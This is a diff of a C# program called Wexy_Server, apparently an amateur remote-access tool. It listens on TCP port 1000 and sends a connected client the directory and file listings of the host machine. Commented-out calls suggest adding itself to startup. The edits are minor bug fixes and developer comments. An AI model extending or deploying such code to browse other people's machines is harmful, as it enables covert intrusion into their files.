@@ -146,6 +146,7 @@ namespace Wexy_Server
 
         #region Commands
 
+        // - ALMOST OK - 
         public static void KillWexy()
         {
             //RemoveFromStartup();
@@ -226,15 +227,9 @@ namespace Wexy_Server
                 string folders = "";
                 foreach (string item in directories)
                 {
-                    folders = folders + item + "\n";
+                    folders = folders + item + "/\n";
                 }
 
-                /*tryout **  send an array throught bytes
-                string[] xfolders = null;
-                for (int i = 0; i < directories.Length; i++)
-                {
-                    xfolders[i] = directories[i];
-                }*/
                 byte[] Packet = Encoding.ASCII.GetBytes(folders);
                 Writer.Write(Packet, 0, Packet.Length);
                 Writer.Flush();
@@ -245,17 +240,26 @@ namespace Wexy_Server
         // - ALMOST OK - It doesn't display the first file and the last ones , only a few files..
         public static void ListFiles(string location)
         {
-            string files = "----------------";
+            string files = "";
             System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(location);
-           
-            foreach (System.IO.FileInfo f in dir.GetFiles("*.*"))
+            FileInfo[] file = dir.GetFiles("*.*");
+            if (file.Length != 0)
             {
-                files = files + "\n" + f.Name + " - " + f.Length.ToString()+" bytes" +"\n----------------";
+                foreach (System.IO.FileInfo f in dir.GetFiles("*.*"))
+                {
+                    files = files + "\n" + f.Name + " - " + f.Length.ToString() + " bytes";
+                }
+                byte[] Packet = Encoding.ASCII.GetBytes(files);
+                Writer.Write(Packet, 0, Packet.Length);
+                Writer.Flush();
             }
-
-            byte[] Packet = Encoding.ASCII.GetBytes(files);
-            Writer.Write(Packet, 0, Packet.Length);
-            Writer.Flush();
+            else
+            {
+                files = "no files here...";
+                byte[] Packet = Encoding.ASCII.GetBytes(files);
+                Writer.Write(Packet, 0, Packet.Length);
+                Writer.Flush();
+            }           
         }
 
         // - ALMOST OK - 
@@ -399,10 +403,10 @@ namespace Wexy_Server
 
             //addToStarup();
             listenner = new TcpListener(IPAddress.Any, 1000);
-            //listenner = new TcpListener(IpAdress.Parse("external_ip", 2000);
+            //listenner = new TcpListener(IpAdress.Parse("external_ip", 2000); <- not working , gotta find another way for it to work online
             listenner.Start();
 
-            for (int i = 0; i < 10; i++)
+            for (int i = 0; i < 10; i++) // < - not the best way
             {
                 client = listenner.AcceptTcpClient();
                 Receiver = client.GetStream();
